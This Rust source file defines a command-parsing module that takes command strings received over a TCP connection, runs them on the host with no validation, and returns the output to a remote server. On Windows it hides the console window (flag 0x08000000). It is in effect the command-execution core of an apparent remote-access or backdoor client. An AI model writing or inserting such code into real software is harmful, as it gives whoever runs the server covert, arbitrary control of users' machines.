use std::{process::{Command, Stdio}, net::TcpStream};
use crate::model::command_model::{CommandModel};

use super::socket_util::SocketUtil;
pub struct CommandParse;
impl CommandParse {
    #[cfg(windows)]
    fn get_os_result<'a>(operation: &str, args: impl Iterator<Item = &'a str>) -> Result<String, Box<dyn std::error::Error>>{
        use encoding::all::GBK;
        use encoding::{DecoderTrap, Encoding};
        use std::os::windows::process::CommandExt;

        let output: Vec<u8> = Command::new(operation)
            .creation_flags(0x08000000)
            .args(args)
            .stdout(Stdio::piped())
            .spawn()?
            .wait_with_output()?
            .stdout;
        let output_clone = output.clone();
        match String::from_utf8(output){
            Ok(res) => Ok(res),
            Err(_) => Ok(GBK.decode(&output_clone, DecoderTrap::Strict)?)
        }
    }
    #[cfg(not(windows))]
    fn get_os_result<'a>(operation: &str, args: impl Iterator<Item = &'a str>) -> Result<String, Box<dyn std::error::Error>>{
        let output: Vec<u8> = Command::new(operation)
            // 参数列表
            .args(args)
            // 等待获取管道中的输出
            .stdout(Stdio::piped())
            // 开辟单独线程执行
            .spawn()?
            // 等待执行结果
            .wait_with_output()?
            .stdout;
        Ok(String::from_utf8(output)?)
    }

    // 尝试获取结果，用box封装可以达到自动类型转换 （多态特性，类型提升
    fn try_catch_exc(data: String) -> Result<String, Box<dyn std::error::Error>>{
        // 以空格对命令进行分割
        let data: std::str::Split<&str> = data.split(" ");
        let operation = &data.clone().into_iter().nth(0).unwrap().trim_end();
        let args = data.into_iter().skip(1);
        let output = CommandParse::get_os_result(operation, args);
        match output {
            Ok(result) => Ok(result),
            Err(err) => Err(err)
        }
    }
    pub fn parse(model: &mut CommandModel, stream: &mut TcpStream) {
        match CommandParse::try_catch_exc(model.data.clone()) {
            Ok(res) => {
                model.data = res;
                let json = serde_json::to_string(&model).unwrap();
                // print!("{}", json);
                SocketUtil::send_to_server(json, stream);
            },
            Err(err) => SocketUtil::send_error_server(err.to_string(), stream)
        }
    }
}